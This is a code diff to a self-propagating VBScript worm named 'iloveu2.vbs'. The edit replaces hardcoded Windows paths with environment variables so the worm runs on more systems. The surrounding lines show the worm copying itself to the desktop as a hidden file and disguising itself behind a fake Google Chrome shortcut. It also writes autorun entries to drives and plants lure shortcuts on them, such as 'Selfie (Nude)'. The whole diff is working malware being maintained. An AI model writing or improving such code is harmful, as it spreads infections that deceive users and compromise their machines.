@@ -5,6 +5,8 @@ set drives = fso.drives
 set ws = createobject("wscript.shell")
 body = fso.opentextfile(wscript.scriptfullname).readall
 desktop = ws.specialfolders("desktop")
+program_files = ws.ExpandEnvironmentStrings("%PROGRAMFILES(x86)%")
+windows = ws.ExpandEnvironmentStrings("%WINDIR%")
 myself = desktop & "\iloveu2.vbs"
 if(fso.fileexists(myself)=false) then
 set file = fso.createtextfile(myself)
@@ -15,7 +17,7 @@ set file_attrib = fso.getfile(myself)
 file_attrib.attributes = 128+2+4
 set shortcut = ws.createshortcut(desktop&"\Google Chrome.lnk")
 shortcut.targetpath = myself
-shortcut.iconlocation = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+shortcut.iconlocation = program_files&"\Google\Chrome\Application\chrome.exe"
 shortcut.save 
 while(1)
 wscript.sleep 10000
@@ -34,7 +36,7 @@ file.writeline ";"&rnd
 file.writeline ";"&rnd
 file.writeline "Open="&drive&"\iloveu2.vbs"
 file.writeline ";"&rnd
-file.writeline "Icon=C:\Windows\System32\shell32.dll,4"
+file.writeline "Icon="&windows&"\System32\shell32.dll,4"
 file.writeline ";"&rnd
 file.writeline ";"&rnd
 file.close
@@ -55,7 +57,7 @@ set shortcut = ws.createshortcut(drive&"\Selfie (Nude).lnk")
 case 4
 set shortcut = ws.createshortcut(drive&"\WAG BUKSAN.lnk")
 end select 
-shortcut.iconlocation = "C:\Windows\System32\shell32.dll,4"
+shortcut.iconlocation = windows&"\System32\shell32.dll,4"
 shortcut.targetpath = drive&"\iloveu2.vbs"
 shortcut.save
 end if
